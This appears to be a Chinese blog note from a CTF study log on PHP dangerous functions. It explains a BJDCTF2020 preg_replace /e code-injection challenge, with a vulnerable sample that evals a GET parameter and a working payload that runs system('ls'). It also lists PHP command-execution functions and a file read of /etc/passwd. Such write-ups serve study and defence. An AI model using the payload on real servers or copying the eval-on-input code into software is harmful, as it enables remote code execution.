---
title: "php命令执行函数"
pubDatetime: 2025-01-20T00:00:00.000+08:00
description: "PHP 危险函数、命令执行函数与绕过方式记录"
tags: ["php"]
---
## preg_match的/e模式

[文章](https://xz.aliyun.com/t/2557)

题目来自[buu-BJDCTF2020_January](https://buuoj.cn/challenges#[BJDCTF2020]ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4)

preg_match(pattern, 替换成的字符串, str)
当pattern中采用了/ / ..e模式时，每当str中匹配到pattern，就会把参数2当做代码执行。

1. 参数2可控 ---> 直接执行命令
2. 参数2固定格式，如
```php
function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}
foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}
function getFlag(){
	@eval($_GET['cmd']);
}
```
```payload
url?\S*=${getFlag()}&cmd=system("ls")
```
```\\1```是正则表达式中的第一个捕获项，由于表达式是(\S*)，\$str均被匹配,因此
执行的是```strtolower("${getFlag()}")```
接下来回答以下几个问题
**Q1：** 为什么不使用.*匹配
A: 以下这些字符作为变量名时,会被替换成'_',其中就包括了字符'.'
![](assets/php命令执行函数/chr_to__.png)

**Q2:** 为什么要用\${getFlag()}而不用getFlag()?
A: 因为如果用后者,那么将执行```strtolower("getFlag()")```,其中getFlag()只是普通的字符串.而执行```strtolower("${getFlag()}")```, 其中\${}的格式是[可变变量](https://www.php.net/manual/zh/language.variables.variable.php)
,也就是会先自动解析{}中的变量,然后再把它作为变量名.显然\$flag{...}是未定义的变量,也就是null.所以得到flag依赖于getFlag()函数中将flag打印出来
**Q3:** 为什么不能直接```url?\S*=${system('ls')}```?
A: 经测试会报错 unexpected "ls"

2025/3/10: 

传递的参数是字符串，`'`和`"`也不例外, 因此`'`变认为是一个常量字符串,
传递```url?\S*=${system('ls')}```时, 执行的是```strtolower("${system(\'ls\')}")```, 也就是说`'`会被转义, 因此会报`syntax error, unexpected '`
![alt text](assets/php命令执行函数/preg_match_syntax_error.png)
和网页上的报错一致

终于...

---

可能与```'strtolower("\\1")'```中把```'```和```"```都用掉了有关系,导致
\$str这个参数不能出现引号. ==> nope

奇怪的是```url?\S*=${system(ls)}```意外的可以运行
但是```ls /```又不能运行, ... 暂时不深究

## 命令执行
```php
exec("whoami");

popen("whoami", "w");

shell_exec("whoami");

passthru("whoami");

system("whoami");

array_map('system', ['whoami']);

array_filter(['whoami'], 'system');

`whoami`;

pcntl_exec('/bin/whoami', []);

// proc_open
<?php
$descriptorspec = [
    0 => ["pipe", "r"], // 标准输入：管道读取模式
    1 => ["pipe", "w"], // 标准输出：管道写入模式
    2 => ["pipe", "w"]  // 标准错误
];
$process = proc_open('whoami', $descriptorspec, $pipes);
echo "输出结果：\n" . stream_get_contents($pipes[1]);
fclose($pipes[1]);
$return_value = proc_close($process);

```

## 代码执行

```php
eval, assert, preg_match, include
```

## 其他危险函数

```php
file_get_contents, file_put_contents, curl_exec, call_user_func
show_source("/etc/passwd"), highlight_file("/etc/passwd"), readfile // 直接输出, 任意文件读

```
